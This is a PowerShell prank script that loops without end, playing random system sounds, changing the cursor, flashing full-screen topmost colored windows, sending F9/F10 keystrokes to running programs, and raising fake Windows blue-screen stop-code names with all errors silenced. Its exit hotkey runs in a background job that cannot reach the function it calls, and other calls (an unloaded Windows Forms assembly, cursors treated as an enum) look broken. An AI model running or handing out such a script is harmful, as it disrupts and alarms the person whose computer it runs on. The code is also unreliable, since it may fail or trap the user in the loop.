$errorActionPreference = 'SilentlyContinue'

function Play-RandomSound {
    $sounds = @(
        [System.Windows.Forms.SystemSounds]::Beep,
        [System.Windows.Forms.SystemSounds]::Asterisk,
        [System.Windows.Forms.SystemSounds]::Exclamation,
        [System.Windows.Forms.SystemSounds]::Hand,
        [System.Windows.Forms.SystemSounds]::Question
    )
    $randomSound = $sounds | Get-Random
    $randomSound.Play()
}

function Change-MouseCursor {
    $cursorTypes = [System.Windows.Forms.Cursors].GetEnumValues() | Where-Object { $_ -ne [System.Windows.Forms.Cursors]::Default }
    $randomCursor = $cursorTypes | Get-Random
    [System.Windows.Forms.Cursor]::Current = $randomCursor
}

function Flash-Screen {
    $flashColors = @("Red", "Blue", "Green", "Yellow", "Pink")
    $randomColor = $flashColors | Get-Random
    $flashScript = {
        $flashForm = New-Object System.Windows.Forms.Form
        $flashForm.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
        $flashForm.BackColor = [System.Drawing.Color]::$randomColor
        $flashForm.TopMost = $true
        $flashForm.Show()
        Start-Sleep -Seconds 0.5
        $flashForm.Hide()
    }
    Invoke-Command $flashScript
}

function Minimize-Maximize-Windows {
    $visibleWindows = Get-Process | Where-Object { $_.MainWindowHandle -ne 0 }
    foreach ($window in $visibleWindows) {
        if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) {
            $window.MainWindowHandle | Out-Null
            [System.Windows.Forms.SendKeys]::SendWait("{F9}")
        } else {
            $window.MainWindowHandle | Out-Null
            [System.Windows.Forms.SendKeys]::SendWait("{F10}")
        }
    }
}

function Trigger-SystemError {
    $errorMessages = @(
        "SYSTEM_SERVICE_EXCEPTION",
        "ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY",
        "KMODE_EXCEPTION_NOT_HANDLED",
        "SYSTEM_THREAD_EXCEPTION_NOT_HANDLED"
    )
    $randomError = $errorMessages | Get-Random
    throw $randomError
}

function Exit-Madness {
    $key = [System.Windows.Forms.Keys]::Control -bor [System.Windows.Forms.Keys]::Shift -bor [System.Windows.Forms.Keys]::K
    $keyListener = New-Object System.Windows.Forms.Form
    $keyListener.KeyPreview = $true
    $keyListener.Add_KeyDown({
        if ($_.Control -and $_.Shift -and $_.KeyCode -eq [System.Windows.Forms.Keys]::K) {
            $keyListener.Close()
            exit
        }
    })
    $keyListener.ShowDialog()
}

Start-Job { Exit-Madness }

while ($true) {
    Play-RandomSound
    Change-MouseCursor
    Flash-Screen
    Minimize-Maximize-Windows

    try {
        Trigger-SystemError
    } catch {

    }

    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
}
